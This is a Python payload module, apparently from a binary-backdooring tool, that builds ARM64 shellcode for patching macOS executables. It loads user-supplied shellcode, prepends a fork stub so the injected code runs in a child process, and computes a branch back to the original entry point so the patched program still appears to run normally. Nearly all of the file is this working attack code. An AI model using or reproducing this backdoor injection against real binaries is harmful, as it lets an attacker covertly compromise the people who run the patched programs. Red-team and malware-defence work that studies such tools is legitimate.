import struct
import os
import logging
from core import support
from common import common

logger = logging.getLogger(__name__)


class user_supplied_shellcode():

    def __init__(self):
        logger.debug("In file {0}".format(str(os.path.abspath(__file__))))
        self.name = "user_supplied_shellcode"
        self.description = """user_supplied_shellcode (non-stager)"""
        self.requirements = {'MODE': 'How the patching will happen',
                             'SUPPLIED_SHELLCODE': 'time in secs to delay',
                             'ENCODER': '<Encoder you want to use, else none>'
                             }
        self.supported_modes = ['remove_signature']
        self.shellcode = ""
        self.apis_needed = None
        self.payload_type = 'single'

    def invoke(self, PM):
        # Expose patching method objects

        self.PM = PM
        # Expose BDF method objects
        self.BDF = self.PM.BDF
        logger.debug(f"IN PAYLOAD DEBUG: {dir(self)}")
        logger.debug(dir(self.PM))
        if support.support(self).check_reqs() is False:
            return False

        return self.run()

    def run(self):

        self.shellcode2 = open(self.SUPPLIED_SHELLCODE, 'r+b').read()

        # self.shellcode1 = b"\x00\x00\x3e\xd4"     breakpoint brk #0xf000
        self.shellcode1 = b"\xfb\x03\x01\xaa"     # mov x27, x1
        self.shellcode1 += b"\xfc\x03\x00\xaa"    # mov x28, x0
        self.shellcode1 += b"\x50\x00\x80\xd2"    # mov     x16, #0x2
        self.shellcode1 += b"\x01\x10\x00\xd4"    # svc     #0   # FORK
        self.shellcode1 += b"\xFA\x03\x00\xAA"    # mov x26, x0
        self.shellcode1 += b"\x90\x02\x80\xD2"    # movz x16, #20   //getpid()
        self.shellcode1 += b"\x01\x10\x00\xd4"    # svc getpid()
        self.shellcode1 += b"\x1F\x00\x1A\xEB"    # cmp x0, x26
        self.shellcode1 += b"\xe1\x03\x1b\xaa"    # mov x1, x27
        self.shellcode1 += b"\xe0\x03\x1c\xaa"    # mov x0, x28

        # now to calculate the offset for //bne main ==> "\xe1\x04\x00\x54"
        PC = struct.unpack("<I", self.BDF.text_section['Offset'])[0] - \
            len(self.shellcode2)

        target = struct.unpack("<I", self.BDF.text_section['Offset'])[0]
        offset = target - PC + 4

        instr_value = struct.pack("<I", ((offset << 2) * 2) + 1).strip(b"\x00")

        if len(instr_value) < 3:
            instr_value += b"\x00" * (3 - len(instr_value))

        self.shellcode1 += instr_value

        self.shellcode1 += b"\x54"
        # calculate branch instruction to original entry
        PC = struct.unpack("<I", self.BDF.text_section['Offset'])[0]  - 4
        target = struct.unpack("<Q", self.BDF.LC_MAIN['EntryOffset'])[0]
        instr = struct.pack("<I", (0b000101 << 26) | (target - PC) >> 2)

        self.shellcode = self.shellcode1 + self.shellcode2 + instr

        return self.shellcode
